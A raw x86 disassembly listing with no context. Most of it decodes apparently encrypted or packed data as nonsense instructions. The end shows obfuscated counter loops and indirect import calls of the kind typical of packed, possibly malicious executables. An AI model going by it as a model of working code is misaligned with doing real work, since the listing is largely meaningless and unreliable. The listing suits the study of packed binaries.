  409996:	(bad)  
  409997:	xor    dh,bh
  409999:	rcr    BYTE PTR [eax+0x58ca26d0],1
  40999f:	out    0xa,eax
  4099a1:	inc    edi
  4099a2:	in     eax,dx
  4099a3:	fld    TBYTE PTR [ebp-0x49]
  4099a6:	mov    eax,ds:0x93011cc7
  4099ab:	xchg   ebp,edx
  4099ad:	(bad)  
  4099ae:	sbb    al,0xbd
  4099b0:	sbb    al,BYTE PTR [edi+ecx*8+0x52f19c87]
  4099b7:	mov    al,0x75
  4099b9:	retf   
  4099ba:	push   ecx
  4099bb:	xchg   BYTE PTR [edi-0x6fb7f194],bl
  4099c1:	or     eax,0x72d2a82
  4099c6:	out    0xa7,al
  4099c8:	aas    
  4099c9:	aad    0xa6
  4099cb:	das    
  4099cc:	or     DWORD PTR [eax+0x69fc5edb],edi
  4099d2:	sbb    eax,0xbc6c6809
  4099d7:	hlt    
  4099d8:	add    ch,BYTE PTR [esp+esi*2]
  4099db:	xchg   edx,eax
  4099dc:	mov    al,0x3f
  4099de:	aam    0xc0
  4099e0:	cmp    ah,BYTE PTR [eax+0x4677b72e]
  4099e6:	xchg   ebp,eax
  4099e7:	inc    esi
  4099e8:	push   edi
  4099e9:	inc    edx
  4099ea:	push   esp
  4099eb:	fnsave [esi+0xc]
  4099ee:	fwait
  4099ef:	addr16 std 
  4099f1:	or     bh,BYTE PTR [esp+edi*4-0x2fbc33fc]
  4099f8:	jne    0x4099eb
  4099fa:	shr    ch,cl
  4099fc:	icebp  
  4099fd:	ret    0xc886
  409a00:	sbb    al,0xcf
  409a02:	jns    0x409a53
  409a04:	push   esp
  409a05:	mov    dh,BYTE PTR [esi]
  409a07:	loop   0x409a22
  409a09:	mov    al,ds:0x636757bc
  409a0e:	cdq    
  409a0f:	fs xchg ecx,eax
  409a11:	mov    ah,0x51
  409a13:	daa    
  409a14:	dec    ebp
  409a15:	mov    ebx,0x9dea2409
  409a1a:	xor    dl,BYTE PTR [eax]
  409a1c:	adc    bl,bh
  409a1e:	test   eax,0xa0aa9aa5
  409a23:	inc    esi
  409a24:	push   ecx
  409a25:	xor    al,0x47
  409a27:	or     BYTE PTR [ecx-0x6fffdbd7],0x0
  409a2e:	je     0x409a76
  409a30:	dec    ebp
  409a31:	stos   DWORD PTR es:[edi],eax
  409a32:	fcomp  st(4)
  409a34:	adc    dl,BYTE PTR [edx+0x614c0944]
  409a3a:	daa    
  409a3b:	addr16 retf 
  409a3d:	sbb    cl,BYTE PTR [edi-0x33160d91]
  409a43:	pop    esi
  409a44:	(bad)  
  409a45:	pop    edi
  409a46:	test   dh,bh
  409a48:	and    eax,0x91468b43
  409a4d:	xchg   ecx,eax
  409a4e:	fimul  DWORD PTR [ebx+0x2b61ddf]
  409a54:	mov    ?,WORD PTR [esi-0x6e]
  409a57:	pop    esi
  409a58:	mov    ebx,0x2944ea43
  409a5d:	pop    eax
  409a5e:	sbb    al,0xc0
  409a60:	out    0x43,eax
  409a62:	cli    
  409a63:	mov    ah,0x89
  409a65:	cmp    al,0x19
  409a67:	or     al,0x22
  409a69:	pop    eax
  409a6a:	call   0xabff:0x4aa2f8cb
  409a71:	mov    cl,0x6c
  409a73:	sbb    bh,BYTE PTR [ebx-0x4c10b427]
  409a79:	mov    eax,0x86375446
  409a7e:	or     DWORD PTR [edx-0x51],ecx
  409a81:	lock nop
  409a83:	jl     0x409abb
  409a85:	jmp    0xed3bb55d
  409a8a:	mov    esp,DWORD PTR [edx+0x3eda832f]
  409a90:	push   0x9e54dde8
  409a95:	aam    0xa8
  409a97:	adc    ch,ch
  409a99:	ror    bl,cl
  409a9b:	dec    esi
  409a9c:	inc    eax
  409a9d:	cmp    al,dh
  409a9f:	arpl   WORD PTR [ebx],si
  409aa1:	aam    0x51
  409aa3:	jmp    0x28c3:0x1430369a
  409aaa:	jge    0x409a5e
  409aac:	outs   dx,DWORD PTR ds:[esi]
  409aad:	mov    ebx,0xfa7d1f40
  409ab2:	dec    edx
  409ab3:	aam    0xd5
  409ab5:	outs   dx,BYTE PTR ds:[esi]
  409ab6:	push   ecx
  409ab7:	jo     0x409a56
  409ab9:	xor    BYTE PTR [esi],cl
  409abb:	mov    bh,0x12
  409abd:	dec    esi
  409abe:	fwait
  409abf:	xchg   esp,esp
  409ac1:	mov    bh,dh
  409ac3:	cmp    BYTE PTR [edx+0x72e8f324],dl
  409ac9:	pop    ds
  409aca:	push   cs
  409acb:	int    0x2f
  409acd:	jb     0x409a6b
  409acf:	xor    eax,0xb8066871
  409ad4:	pusha  
  409ad5:	fist   WORD PTR [esi]
  409ad7:	or     al,0x73
  409ad9:	bsr    ebx,ecx
  409adc:	popf   
  409add:	jo     0x409ae0
  409adf:	jnp    0x409ac7
  409ae1:	cmc    
  409ae2:	rcl    BYTE PTR [esi+0x57],cl
  409ae5:	std    
  409ae6:	bound  edi,QWORD PTR [esi+0x43]
  409ae9:	cmp    BYTE PTR [edi],bl
  409aeb:	push   ebx
  409aec:	call   0x5d0d:0x9caa97de
  409af3:	sub    eax,0x52667823
  409af8:	xchg   BYTE PTR [esi-0x7d89a393],cl
  409afe:	mov    edx,0x1856f46c
  409b03:	inc    eax
  409b04:	xor    ebp,DWORD PTR [ebx+0x0]
  409b07:	ficomp DWORD PTR [esi+0x43]
  409b0a:	push   es
  409b0b:	aam    0x3
  409b0d:	inc    eax
  409b0e:	jne    0x409b20
  409b10:	push   ebx
  409b11:	mov    edi,0xbdb44fc4
  409b16:	fs push esi
  409b18:	sub    eax,0xa737f36f
  409b1d:	dec    ecx
  409b1e:	xchg   edx,eax
  409b1f:	mov    cl,0x43
  409b21:	sub    DWORD PTR [edx],esp
  409b23:	jb     0x409aba
  409b25:	ror    al,cl
  409b27:	mov    ecx,0x58d2c922
  409b2c:	pop    es
  409b2d:	adc    ebx,esi
  409b2f:	or     eax,0x34a51909
  409b34:	sbb    ebx,DWORD PTR [ebx-0x4]
  409b37:	push   es
  409b38:	test   DWORD PTR [edx-0x17],ebp
  409b3b:	stos   BYTE PTR es:[edi],al
  409b3c:	imul   edx,DWORD PTR [eax-0x59],0x8
  409b40:	mov    ebp,0x2f74d82d
  409b45:	loope  0x409b27
  409b47:	mov    esp,0xcb80de3c
  409b4c:	xchg   esi,eax
  409b4d:	icebp  
  409b4e:	test   bl,dh
  409b50:	mov    edi,0x13017824
  409b55:	sbb    dh,BYTE PTR [ebx+0x5f]
  409b58:	mov    ss,WORD PTR [ebp+0x15]
  409b5b:	fs shl edi,0x76
  409b5f:	add    al,0xc8
  409b61:	(bad)  
  409b62:	out    dx,eax
  409b63:	inc    esp
  409b64:	and    edx,ecx
  409b66:	ds inc edi
  409b68:	push   bx
  409b6a:	scas   al,BYTE PTR es:[edi]
  409b6b:	gs and al,0x72
  409b6e:	mov    ebx,DWORD PTR [edx-0x3f]
  409b71:	xchg   ebp,eax
  409b72:	xor    ebp,ebp
  409b74:	push   eax
  409b75:	mov    ds:0xc0d7e1f7,al
  409b7a:	jae    0x409baf
  409b7c:	je     0x409bf6
  409b7e:	sub    eax,0x81443218
  409b83:	and    eax,0x15157621
  409b88:	push   esi
  409b89:	ret    0x8d63
  409b8c:	xchg   ebp,eax
  409b8d:	xchg   DWORD PTR [eax],ebp
  409b8f:	mov    bl,BYTE PTR [eax]
  409b91:	outs   dx,BYTE PTR ds:[esi]
  409b92:	or     cl,bh
  409b94:	or     bl,BYTE PTR [eax+edx*8-0x2f2209ee]
  409b9b:	fcomp  st(0)
  409b9d:	fdivr  DWORD PTR [edx+0x2e3778b4]
  409ba3:	jmp    0x409b2d
  409ba5:	pop    es
  409ba6:	pop    edi
  409ba7:	pop    edi
  409ba9:	outs   dx,DWORD PTR ds:[esi]
  409baa:	dec    ebx
  409bab:	mov    ebx,0x1095a9c4
  409bb0:	dec    ebp
  409bb1:	mov    ebx,0x95248c22
  409bb6:	dec    ecx
  409bb7:	or     eax,0xa3936a97
  409bbc:	cld    
  409bbd:	in     al,0x9
  409bbf:	inc    ch
  409bc1:	jns    0x409c3a
  409bc3:	mov    WORD PTR [ecx],fs
  409bc5:	add    DWORD PTR cs:[edi-0x52],esp
  409bc9:	dec    edx
  409bca:	xchg   esp,eax
  409bcb:	jle    0x409b4d
  409bcd:	es cli 
  409bcf:	mov    ah,0x59
  409bd1:	stos   BYTE PTR es:[edi],al
  409bd2:	cmp    BYTE PTR [eax+edx*8-0x3f6e3d63],dl
  409bd9:	add    BYTE PTR [edx],0x2a
  409bdc:	shl    ah,1
  409bde:	xor    eax,DWORD PTR [eax-0x52]
  409be1:	das    
  409be2:	xchg   esp,eax
  409be3:	sub    al,0xa5
  409be5:	or     eax,0xb1af41c9
  409bea:	pop    ss
  409beb:	js     0x409b9f
  409bed:	sub    ebx,DWORD PTR [ebx-0x1debed5c]
  409bf3:	adc    eax,DWORD PTR [esp+ebx*2-0x26]
  409bf7:	jg     0x409c61
  409bf9:	xchg   ebx,eax
  409bfa:	dec    ebp
  409bfb:	sub    al,0xd
  409bfd:	mov    cl,0x5e
  409bff:	leave  
  409c00:	xchg   esi,eax
  409c01:	stos   BYTE PTR es:[edi],al
  409c02:	add    eax,0x732c8d97
  409c07:	enter  0x9072,0x5a
  409c0b:	add    ecx,DWORD PTR [ebx+ebx*1-0x6e]
  409c0f:	fsubr  st,st(5)
  409c11:	add    DWORD PTR [edi+edx*1+0x6350c7bb],edi
  409c18:	aaa    
  409c19:	xchg   edx,eax
  409c1a:	into   
  409c1b:	add    edx,ebx
  409c1d:	sbb    eax,0x2130618b
  409c22:	clc    
  409c23:	push   ebx
  409c24:	into   
  409c25:	xchg   BYTE PTR [ecx+0x10],ah
  409c28:	loopne 0x409c41
  409c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c2c:	in     al,dx
  409c2d:	push   esi
  409c2e:	pop    eax
  409c2f:	jne    0x409c01
  409c31:	(bad)  
  409c32:	cli    
  409c33:	jmp    0xc0d4ff62
  409c38:	pushf  
  409c39:	inc    ebp
  409c3a:	mov    ?,eax
  409c3c:	int    0x87
  409c3e:	mov    esi,0x31337a3a
  409c43:	pop    ds
  409c44:	mov    esp,0x2f630cf7
  409c49:	cmp    ebx,0x32
  409c4c:	js     0x409c29
  409c4e:	out    dx,eax
  409c4f:	sbb    DWORD PTR [ebx+eiz*1+0xd],edx
  409c53:	xchg   ebx,eax
  409c54:	or     DWORD PTR [ebp+0x6d07ac3b],edx
  409c5a:	push   ebx
  409c5b:	(bad)  
  409c5c:	push   ebp
  409c5d:	push   ebx
  409c5e:	pop    esp
  409c5f:	sahf   
  409c60:	leave  
  409c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c62:	push   ebx
  409c63:	xchg   edx,eax
  409c64:	pop    ss
  409c65:	cmp    ecx,esp
  409c67:	xor    DWORD PTR [ecx-0x6],0x568d2e37
  409c6e:	cs imul ecx,edi,0x69392f48
  409c75:	sub    DWORD PTR [edx+0x266185da],ecx
  409c7b:	push   0x748538dd
  409c80:	fiadd  DWORD PTR ds:0x1d4327c9
  409c86:	fs clc 
  409c88:	xchg   edi,eax
  409c89:	test   DWORD PTR [edx-0x18f9350f],esp
  409c8f:	add    ch,BYTE PTR [eax-0x31]
  409c92:	dec    BYTE PTR [ebp+eax*4+0x42]
  409c96:	loopne 0x409c4a
  409c98:	bound  esp,QWORD PTR [eax]
  409c9a:	and    bl,BYTE PTR [ebp-0x5c21e692]
  409ca0:	rep ins BYTE PTR es:[edi],dx
  409ca2:	cmp    bl,BYTE PTR [esp+ebp*4]
  409ca5:	xor    BYTE PTR [edi-0x80],dh
  409ca8:	scas   eax,DWORD PTR es:[edi]
  409ca9:	and    ch,BYTE PTR [edi-0xe4cfb22]
  409caf:	push   eax
  409cb0:	xlat   BYTE PTR ds:[ebx]
  409cb1:	test   ah,bh
  409cb3:	inc    ecx
  409cb4:	dec    ebp
  409cb5:	dec    esi
  409cb6:	rol    DWORD PTR [eax-0x17],cl
  409cb9:	push   esp
  409cba:	mov    eax,ds:0x63a00d94
  409cbf:	call   0x2706:0x5b83b646
  409cc6:	mov    ah,0x6
  409cc8:	or     al,0xd7
  409cca:	xor    dl,BYTE PTR [esi-0x24]
  409ccd:	push   ds
  409cce:	mov    eax,0xb2aff125
  409cd3:	pushf  
  409cd4:	push   ecx
  409cd5:	fdivr  DWORD PTR [ebp+0x28]
  409cd8:	jecxz  0x409c5b
  409cda:	(bad)  
  409cdc:	mov    edi,0x35dd6981
  409ce1:	ss leave 
  409ce3:	mov    ds:0x5266a9e,al
  409ce8:	mov    dl,0xd7
  409cea:	dec    edi
  409ceb:	dec    ecx
  409cec:	stos   DWORD PTR es:[edi],eax
  409ced:	test   eax,0xdb37a068
  409cf2:	(bad)  
  409cf3:	hlt    
  409cf4:	arpl   WORD PTR [ebx-0x71],dx
  409cf7:	or     eax,DWORD PTR [edi+0x44626c19]
  409cfd:	inc    ecx
  409cfe:	(bad)  
  409cff:	mov    ecx,0x411368f5
  409d04:	xchg   edx,eax
  409d05:	cmc    
  409d06:	mov    cl,0x50
  409d08:	shl    BYTE PTR [esi+0x6f],cl
  409d0b:	adc    ecx,esp
  409d0d:	das    
  409d0e:	adc    edi,eax
  409d10:	mov    ah,0x85
  409d12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d13:	inc    ebp
  409d14:	popf   
  409d15:	push   ebp
  409d16:	jl     0x409d77
  409d18:	call   FWORD PTR [edx]
  409d1a:	push   0x46
  409d1c:	or     cl,bh
  409d1e:	mov    eax,ds:0xb683b3c5
  409d23:	pop    edx
  409d24:	xchg   ebp,eax
  409d25:	jb     0x409d5f
  409d27:	and    cl,BYTE PTR [edx-0x2c]
  409d2a:	or     eax,0x8887feab
  409d2f:	push   edx
  409d30:	mov    al,0x8f
  409d32:	mov    al,ds:0xf8ae00e6
  409d37:	frstor [ecx+0x39e48278]
  409d3d:	add    BYTE PTR ds:0x826660d5,0x2c
  409d44:	aad    0x85
  409d46:	gs xor al,0x1d
  409d49:	cdq    
  409d4a:	es (bad) 
  409d4c:	sti    
  409d4d:	outs   dx,DWORD PTR ds:[esi]
  409d4e:	sub    al,0xee
  409d50:	adc    eax,0xc19cd3c0
  409d55:	(bad)  
  409d56:	push   edi
  409d57:	xchg   edi,eax
  409d58:	lahf   
  409d59:	ins    BYTE PTR es:[edi],dx
  409d5a:	pop    esp
  409d5b:	inc    ebx
  409d5c:	in     al,0x43
  409d5e:	outs   dx,BYTE PTR ds:[esi]
  409d5f:	(bad)  
  409d60:	scas   eax,DWORD PTR es:[edi]
  409d61:	mov    ss,WORD PTR [ebx+0x3]
  409d64:	test   BYTE PTR [esp+eax*1+0x2a],dh
  409d68:	xor    cl,bh
  409d6a:	out    dx,al
  409d6b:	je     0x409db0
  409d6d:	adc    al,0x4f
  409d6f:	fdivp  st(1),st
  409d71:	or     al,0xc8
  409d73:	mov    esp,0x6274a037
  409d78:	icebp  
  409d79:	xchg   ecx,eax
  409d7a:	mov    eax,0x27417fa7
  409d7f:	fmul   QWORD PTR [ebx+0x5b]
  409d82:	stos   DWORD PTR es:[edi],eax
  409d83:	or     eax,0x545b5eab
  409d88:	xchg   edx,eax
  409d89:	add    ch,BYTE PTR [ebx]
  409d8b:	sahf   
  409d8c:	test   eax,0xd0626124
  409d91:	stc    
  409d92:	push   edx
  409d93:	and    ch,dl
  409d95:	mov    ebp,0x8a07617c
  409d9a:	inc    esp
  409d9b:	sbb    al,0xc9
  409d9d:	xchg   ebx,eax
  409d9e:	mov    ebp,0x635f3d45
  409da3:	out    0x6b,al
  409da5:	dec    esp
  409da6:	and    eax,0xa9134ca5
  409dab:	aaa    
  409dac:	fimul  DWORD PTR [edx]
  409dae:	test   edi,0x783dfbf0
  409db4:	mov    ah,0x59
  409db6:	fld    TBYTE PTR [edx+0xe]
  409db9:	mov    ds:0x41bc24ed,al
  409dbe:	pop    esi
  409dbf:	push   ds
  409dc0:	es jl  0x409da1
  409dc3:	icebp  
  409dc4:	jecxz  0x409dd8
  409dc6:	sub    edx,DWORD PTR [ebx]
  409dc8:	inc    ebx
  409dc9:	mov    bh,0x7d
  409dcb:	adc    al,0x14
  409dcd:	jae    0x409e49
  409dcf:	(bad)  
  409dd0:	imul   BYTE PTR [esi+0x19805162]
  409dd6:	pop    ecx
  409dd7:	sbb    al,0xe0
  409dd9:	ror    BYTE PTR [ecx],1
  409ddb:	leave  
  409ddc:	dec    ecx
  409ddd:	xchg   esi,eax
  409dde:	mov    ah,0x64
  409de0:	dec    bl
  409de2:	adc    DWORD PTR [ebx],0x25
  409de5:	cmp    eax,0x2a1a9e75
  409dea:	inc    ebp
  409deb:	adc    BYTE PTR [ebx],dl
  409ded:	mov    ecx,0x680f5c00
  409df2:	inc    esi
  409df3:	hlt    
  409df4:	cli    
  409df5:	(bad)  
  409df6:	ins    BYTE PTR es:[edi],dx
  409df7:	iret   
  409df8:	(bad)  
  409df9:	cld    
  409dfa:	std    
  409dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dfc:	mul    BYTE PTR [esi+ecx*8+0x15]
  409e00:	inc    ecx
  409e01:	add    bl,BYTE PTR [ecx+0x4158c05d]
  409e07:	push   cs
  409e08:	add    al,0xf9
  409e0a:	leave  
  409e0b:	out    0xb7,eax
  409e0d:	int3   
  409e0e:	cs dec ebp
  409e10:	inc    esp
  409e11:	mov    ds:0x1a603de0,al
  409e16:	cmovne esp,DWORD PTR [ebp+ebp*8+0x4c]
  409e1b:	and    al,0xc9
  409e1d:	cmp    DWORD PTR [esi-0xae7ac5d],esp
  409e23:	dec    eax
  409e24:	xchg   edx,eax
  409e25:	sub    ecx,ebx
  409e27:	pusha  
  409e28:	or     bh,BYTE PTR [ecx+0x66]
  409e2b:	test   eax,0xb29dec07
  409e30:	or     al,0x13
  409e32:	mov    ds:0xb5401b,al
  409e37:	addr16 pop esp
  409e39:	add    DWORD PTR [esi],ebp
  409e3b:	dec    eax
  409e3c:	adc    al,0xd9
  409e3e:	cmp    al,0xe8
  409e40:	xchg   edx,eax
  409e41:	dec    eax
  409e42:	cmp    DWORD PTR [ebx],eax
  409e44:	or     BYTE PTR [ecx-0x15],bh
  409e47:	xchg   edi,eax
  409e48:	and    eax,0xd80c0be9
  409e4d:	scas   al,BYTE PTR es:[edi]
  409e4e:	push   edi
  409e4f:	ret    
  409e50:	scas   eax,DWORD PTR es:[edi]
  409e51:	loopne 0x409e61
  409e53:	outs   dx,DWORD PTR ds:[esi]
  409e54:	dec    edi
  409e55:	adc    eax,0xfb94d68f
  409e5a:	lods   eax,DWORD PTR ds:[esi]
  409e5b:	ja     0x409ecb
  409e5d:	xchg   DWORD PTR [ecx],ebp
  409e5f:	xchg   esi,eax
  409e60:	mov    bl,0xe9
  409e62:	mov    ebx,0x6468294c
  409e67:	inc    esi
  409e68:	jle    0x409e27
  409e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e6b:	xchg   ebx,eax
  409e6c:	out    0xc4,eax
  409e6e:	mov    edx,0x67bca58a
  409e73:	add    ecx,edx
  409e75:	ret    0x5fb8
  409e78:	inc    esi
  409e79:	mov    edx,ecx
  409e7b:	test   BYTE PTR [edi-0x653ba145],bl
  409e81:	cmp    BYTE PTR [esi+eiz*8],al
  409e84:	loop   0x409eb2
  409e86:	jae    0x409e09
  409e88:	je     0x409ede
  409e8a:	push   edx
  409e8b:	push   ds
  409e8c:	push   ss
  409e8d:	jmp    0x5bf08716
  409e92:	push   ebx
  409e93:	fwait
  409e94:	and    DWORD PTR [edx+0x32ddbd97],ebx
  409e9a:	ins    DWORD PTR es:[edi],dx
  409e9b:	mov    WORD PTR [edi+0x6d],cs
  409e9e:	out    dx,eax
  409e9f:	push   ebp
  409ea0:	add    BYTE PTR [ebx],0x3f
  409ea3:	xchg   edx,eax
  409ea4:	cwde   
  409ea5:	sbb    BYTE PTR [ecx+0x63a2bb2e],bl
  409eab:	out    0xb,eax
  409ead:	test   BYTE PTR [edi-0x2b14774d],bh
  409eb3:	jb     0x409e5e
  409eb5:	cmp    BYTE PTR [esi+0x36caa86d],bl
  409ebb:	loope  0x409ea7
  409ebd:	clc    
  409ebe:	int3   
  409ebf:	dec    edi
  409ec0:	mov    ?,WORD PTR [ebx-0x42]
  409ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ec4:	or     eax,0x25709fc2
  409ec9:	arpl   WORD PTR [ecx],di
  409ecb:	xor    eax,0xacb699a0
  409ed0:	leave  
  409ed1:	int    0xbe
  409ed3:	dec    edx
  409ed4:	add    DWORD PTR [eax+0x48],0xcfff231a
  409edb:	test   BYTE PTR [ecx+ecx*4],ch
  409ede:	sub    eax,0xe458b7
  409ee3:	sahf   
  409ee4:	std    
  409ee5:	jg     0x409eb3
  409ee7:	fisubr DWORD PTR [ebx]
  409ee9:	push   ss
  409eea:	leave  
  409eeb:	cmc    
  409eec:	mov    gs,eax
  409eee:	pop    ss
  409eef:	add    BYTE PTR [edi+0xe33807f],bl
  409ef5:	cmc    
  409ef6:	int    0x50
  409ef8:	dec    eax
  409ef9:	les    ebx,FWORD PTR [ecx+eiz*8]
  409efc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409efe:	pop    esi
  409eff:	scas   al,BYTE PTR es:[edi]
  409f00:	and    cl,BYTE PTR [edx-0x37]
  409f03:	nop    DWORD PTR [esi+0x4a1d3f5a]
  409f0a:	ret    0x53a6
  409f0d:	add    eax,0x3b6dfb02
  409f12:	jmp    0x409ee0
  409f14:	push   ss
  409f15:	cld    
  409f16:	pop    esi
  409f17:	mov    esi,0x9760d406
  409f1c:	sbb    al,0xfa
  409f1e:	cmp    al,0x2e
  409f20:	mov    ah,0xef
  409f22:	fisttp WORD PTR [esi+0x71]
  409f25:	aam    0x31
  409f27:	cmc    
  409f28:	pop    ebp
  409f29:	mov    eax,0x2bcda1e4
  409f2e:	mov    ah,0xd6
  409f30:	(bad)  
  409f32:	or     ebx,ecx
  409f34:	dec    eax
  409f35:	fdiv   QWORD PTR [esp+ebx*1+0x6ba6434d]
  409f3c:	and    bh,BYTE PTR [ecx]
  409f3e:	fidiv  WORD PTR [eax]
  409f40:	fwait
  409f41:	cmp    bl,bl
  409f43:	repz test DWORD PTR [ebx-0x1f9e0e66],ebx
  409f4a:	loop   0x409f82
  409f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f4d:	pop    bp
  409f4f:	ds out 0x9c,al
  409f52:	jp     0x409edf
  409f54:	sub    eax,0xc16d44a4
  409f59:	push   ds
  409f5a:	fnstsw ax
  409f5c:	outs   dx,BYTE PTR ds:[esi]
  409f5d:	in     eax,dx
  409f5e:	mov    ecx,0x216eedb2
  409f63:	(bad)  
  409f65:	push   eax
  409f66:	add    bh,BYTE PTR [esi+0x3c]
  409f69:	mov    ds:0x586fbc3e,al
  409f6e:	add    eax,0xa05cda16
  409f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f74:	stos   BYTE PTR es:[edi],al
  409f75:	lea    edi,[edx+0x68]
  409f78:	lea    ecx,[eax+ebx*4]
  409f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f7c:	outs   dx,BYTE PTR ds:[esi]
  409f7d:	icebp  
  409f7e:	jns    0x409f55
  409f80:	dec    edx
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
